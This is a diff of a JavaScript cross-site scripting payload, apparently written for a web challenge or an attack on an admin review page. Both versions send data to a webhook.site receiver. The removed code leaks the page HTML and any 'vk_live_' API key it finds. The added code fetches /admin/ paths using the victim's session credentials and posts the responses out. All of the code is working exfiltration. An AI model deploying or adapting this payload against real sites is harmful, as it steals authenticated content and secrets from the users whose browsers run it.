@@ -1,11 +1,32 @@
-const webhook = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";
+(async () => {
+  const receiver = "https://webhook.site/bbb85c7c-3286-4258-9ca0-8473ede3084e";
 
-// Envoyer le HTML de la page actuelle
-new Image().src = webhook + "?page=" + encodeURIComponent(document.documentElement.outerHTML);
+  for (const path of ["/admin/", "/admin/review.php"]) {
+    try {
+      const response = await fetch(path, {
+        credentials: "include"
+      });
 
-// Chercher l'API key
-const html = document.documentElement.outerHTML;
-const match = html.match(/vk_live_[a-f0-9]{40}/);
-if (match) {
-    new Image().src = webhook + "?api_key=" + match[0];
-}
+      const body = await response.text();
+
+      await fetch(receiver, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+          path: path,
+          url: location.href,
+          body: body
+        })
+      });
+    } catch (error) {
+      await fetch(receiver, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({
+          error: String(error),
+          path: path
+        })
+      });
+    }
+  }
+})();
